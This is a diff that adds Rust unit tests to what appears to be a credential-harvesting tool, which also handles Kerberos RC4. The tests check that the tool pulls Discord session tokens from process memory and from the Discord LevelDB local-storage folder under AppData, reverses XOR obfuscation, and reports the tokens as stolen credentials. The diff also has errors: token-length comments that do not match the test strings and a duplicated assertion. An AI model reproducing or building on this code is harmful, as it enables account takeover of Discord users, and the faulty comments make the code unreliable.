@@ -32,6 +32,128 @@ mod tests {
     use der::Decodable;
     
     #[test]
+    fn test_discord_token_validation() {
+        // Valid token (59 characters)
+        assert!(super::discord::is_valid_discord_token("NTQ2ODM3OTM5NjM3MTQ1NjAw.GY9XbY.jqU0Y9XbYjqU0Y9XbYjqU0Y9XbYjqU0Y9XbY"));
+        
+        // Valid token with mfa. prefix (63 characters)
+        assert!(super::discord::is_valid_discord_token("mfa.NTQ2ODM3OTM5NjM3MTQ1NjAw.GY9XbY.jqU0Y9XbYjqU0Y9XbYjqU0Y9XbYjqU0Y9XbY"));
+        
+        // Invalid token (wrong length)
+        assert!(!super::discord::is_valid_discord_token("NTQ2ODM3OTM5NjM3MTQ1NjAw.GY9XbY.jqU0Y9XbYjqU0Y9XbYjqU0Y9XbYjqU0Y9Xb"));
+        
+        // Invalid token (wrong structure)
+        assert!(!super::discord::is_valid_discord_token("NTQ2ODM3OTM5NjM3MTQ1NjAw.GY9XbY.jqU0Y9XbYjqU0Y9XbYjqU0Y9XbYjqU0Y9XbY.extra"));
+    }
+    
+    #[test]
+    fn test_discord_token_xor_decryption() {
+        // Test XOR decryption with key 0xB6
+        let original = "NTQ2ODM3OTM5NjM3MTQ1NjAw.GY9XbY.jqU0Y9XbYjqU0Y9XbYjqU0Y9XbYjqU0Y9XbY";
+        let obfuscated: String = original.chars()
+            .map(|c| (c as u8 ^ 0xB6) as char)
+            .collect();
+        
+        let decrypted = super::discord::xor_decrypt(&obfuscated, 0xB6);
+        assert_eq!(decrypted, original);
+    }
+    
+    #[test]
+    fn test_discord_memory_scanning() {
+        // Create mock memory data with tokens
+        let mut memory = vec![0u8; 1024];
+        
+        // Add valid token
+        let token = "NTQ2ODM3OTM5NjM3MTQ1NjAw.GY9XbY.jqU0Y9XbYjqU0Y9XbYjqU0Y9XbYjqU0Y9XbY";
+        let token_bytes = token.as_bytes();
+        memory[100..100+token_bytes.len()].copy_from_slice(token_bytes);
+        
+        // Add obfuscated token
+        let obfuscated_token: Vec<u8> = token_bytes.iter()
+            .map(|&b| b ^ 0xB6)
+            .collect();
+        memory[200..200+obfuscated_token.len()].copy_from_slice(&obfuscated_token);
+        
+        // Scan for tokens
+        let tokens = super::discord::scan_memory_for_tokens(&memory, None);
+        assert_eq!(tokens.len(), 2);
+        
+        // Verify tokens
+        assert!(tokens.iter().any(|t| t.token == token));
+        assert!(tokens.iter().any(|t| t.token == token));
+    }
+    
+    #[test]
+    fn test_discord_local_storage_extraction() {
+        // Create mock LevelDB file
+        let temp_dir = TempDir::new().unwrap();
+        let ldb_path = temp_dir.path().join("000003.ldb");
+        
+        // Write mock data with tokens
+        let mut data = Vec::new();
+        data.extend_from_slice(b"random data before token ");
+        data.extend_from_slice(b"NTQ2ODM3OTM5NjM3MTQ1NjAw.GY9XbY.jqU0Y9XbYjqU0Y9XbYjqU0Y9XbYjqU0Y9XbY");
+        data.extend_from_slice(b" random data after token");
+        
+        fs::write(&ldb_path, data).unwrap();
+        
+        // Extract tokens
+        let tokens = super::discord::extract_tokens_from_file(&ldb_path);
+        assert!(tokens.is_ok());
+        let tokens = tokens.unwrap();
+        assert_eq!(tokens.len(), 1);
+        assert_eq!(tokens[0].token, "NTQ2ODM3OTM5NjM3MTQ1NjAw.GY9XbY.jqU0Y9XbYjqU0Y9XbYjqU0Y9XbYjqU0Y9XbY");
+    }
+    
+    #[test]
+    fn test_discord_process_extraction() {
+        // Create mock process memory
+        let memory = b"random data before token NTQ2ODM3OTM5NjM3MTQ1NjAw.GY9XbY.jqU0Y9XbYjqU0Y9XbYjqU0Y9XbYjqU0Y9XbY random data after token";
+        
+        // Scan for tokens
+        let tokens = super::discord::scan_memory_for_tokens(memory, Some(1234));
+        assert_eq!(tokens.len(), 1);
+        
+        // Verify token
+        assert_eq!(tokens[0].token, "NTQ2ODM3OTM5NjM3MTQ1NjAw.GY9XbY.jqU0Y9XbYjqU0Y9XbYjqU0Y9XbYjqU0Y9XbY");
+        assert_eq!(tokens[0].process_id, Some(1234));
+    }
+    
+    #[test]
+    fn test_discord_full_extraction() {
+        // Create mock environment
+        let temp_dir = TempDir::new().unwrap();
+        
+        // Create mock Discord directory structure
+        let discord_path = temp_dir.path().join("AppData\\Roaming\\Discord\\Local Storage\\leveldb");
+        fs::create_dir_all(&discord_path).unwrap();
+        
+        // Create mock LevelDB file with token
+        let ldb_path = discord_path.join("000003.ldb");
+        let token = "NTQ2ODM3OTM5NjM3MTQ1NjAw.GY9XbY.jqU0Y9XbYjqU0Y9XbYjqU0Y9XbYjqU0Y9XbY";
+        let mut data = Vec::new();
+        data.extend_from_slice(b"random data before token ");
+        data.extend_from_slice(token.as_bytes());
+        data.extend_from_slice(b" random data after token");
+        fs::write(&ldb_path, data).unwrap();
+        
+        // Mock environment variables
+        std::env::set_var("APPDATA", temp_dir.path().to_str().unwrap());
+        
+        // Extract tokens
+        let result = super::discord::extract_discord_tokens();
+        assert!(result.is_ok());
+        
+        let tokens = result.unwrap();
+        assert!(!tokens.is_empty());
+        
+        // Verify token
+        assert_eq!(tokens[0].kind, CredentialKind::DiscordToken);
+        assert_eq!(tokens[0].target, "Discord");
+        assert_eq!(tokens[0].password.as_deref(), Some(token));
+    }
+    
+    #[test]
     fn test_kerberos_rc4_encryption() {
         // Test RC4-HMAC encryption
         let pac = b"PAC_DATA";
